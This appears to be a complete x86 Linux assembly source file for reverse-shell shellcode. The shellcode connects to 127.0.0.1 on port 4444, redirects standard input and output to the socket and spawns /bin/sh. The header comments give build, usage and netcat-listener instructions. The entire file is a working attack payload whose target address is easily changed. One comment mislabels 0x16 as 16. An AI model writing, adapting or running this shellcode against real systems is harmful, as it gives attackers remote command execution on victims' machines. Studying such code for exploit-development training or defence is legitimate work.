; Filename: reverse_shell_tcp.nasm
; Author: h3ll0clar1c3
; Purpose: Reverse shell connecting back to IP address 127.0.0.1 on TCP port 4444
; Compilation: ./compile.sh reverse_shell_tcp
; Usage: ./reverse_shell_tcp
; Testing: nc -lv 4444
; Shellcode size: 92 bytes
; Architecture: x86

global   _start

section .text
        _start:

	; initialize registers
	xor eax, eax
	xor ebx, ebx

        ; push socket values onto the stack
        push eax	; push 0 onto the stack, default protocol		
        push 0x1        ; push 1 onto the stack, SOCK_STREAM
        push 0x2        ; push 2 onto the stack, AF_INET
	
        ; 1st syscall - create socket (sockaddr_in struct)	
        mov al, 0x66            ; hex value for socket
        mov bl, 0x1             ; socket
        mov ecx, esp            ; pointer to the arguments pushed
        int 0x80                ; call the interrupt to create the socket, execute the syscall
        mov edx, eax            ; save the return value 

        ; 2nd syscall - connect socket to IP/Port in sockaddr struct
	mov edi, 0xffffffff; XOR IP address with this hex value (avoid NULL's contained in IP)
        xor edi, 0xfeffff80; hex value of 127.0.0.1 XOR'd with 0xffffffff
        push edi	; push XOR'd value onto the stack
        push word 0x5c11; port 4444 is set
        push word 0x2   ; AF_INET = 2
        mov ecx, esp    ; pointer to the arguments
        push 0x16	; length of sockaddr struct, 16
        push ecx        ; push pointer to sockaddr
        push edx        ; push pointer to sockfd
        mov al, 0x66    ; hex value for socket
	mov bl, 3 	; sys_connect = 3
	mov ecx, esp    ; pointer to the arguments
        int 0x80        ; call the interrupt to execute the connect syscall

        ; 3rd syscall - duplicate file descriptors for STDIN, STDOUT and STDERR
	xor ecx, ecx	; clear ecx register
	mov cl, 3	; counter for file descriptors 0,1,2 (STDIN, STDOUT, STDERR)
	mov ebx, edx	; move socket into ebx (new int sockfd)

        loop_dup2:
        dec ecx         ; decrement ecx by 1 (new int sockfd)
	mov al, 0x3f  	; move the dup2 syscall code into the lower part of eax
        int 0x80      	; call interrupt to execute dup2 syscall
        jns loop_dup2   ; repeat for 1,0

        ; 4th syscall - execute /bin/sh using execve
        xor eax, eax	; clear eax register
	push eax        ; terminator placed onto the stack with value of 0
        push 0x68732f6e ; push the end of "//bin/sh", 'hs/n'
        push 0x69622f2f ; push the beginning of "//bin/sh", 'ib//'
	mov byte [esp + 11], al
        mov ebx, esp    ; move pointer to '//bin/sh' into ebx, null terminated
        xor ecx, ecx    ; clear ecx register
        xor edx, edx    ; clear edx register
	mov al, 0xb     ; move syscall code for execve into al
        int 0x80        ; call the interrupt to execute execve syscall, execute '//bin/sh' shell

